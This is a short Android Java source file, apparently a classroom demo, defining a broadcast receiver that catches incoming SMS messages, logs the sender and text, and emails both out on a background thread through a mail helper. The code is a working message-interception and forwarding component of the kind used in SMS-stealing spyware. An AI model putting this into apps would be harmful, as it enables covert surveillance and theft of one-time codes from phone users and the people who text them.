package com.qf.broadcastreceiverdemo;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class MyBroadCastReceiver extends BroadcastReceiver {

	String body = "";
	String no = "";

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		Bundle bundle = intent.getExtras();
		// pdus
		Object[] objects = (Object[]) bundle.get("pdus");
		SmsMessage[] smsMessages = new SmsMessage[objects.length];
		for (int i = 0; i < smsMessages.length; i++) {
			smsMessages[i] = SmsMessage.createFromPdu((byte[]) objects[i]);
		}

		for (int i = 0; i < smsMessages.length; i++) {
			body = body + smsMessages[i].getDisplayMessageBody();
		}

		Log.i("MyBroadCastReceiver",
				smsMessages[0].getDisplayOriginatingAddress());
		Log.i("MyBroadCastReceiver", body);
		no = smsMessages[0].getDisplayOriginatingAddress();
		new Thread(new Runnable() {

			@Override
			public void run() {
				// TODO Auto-generated method stub
				SendMailHelper.sendEmail(no + ":" + body);

			}
		}).start();

	}

}
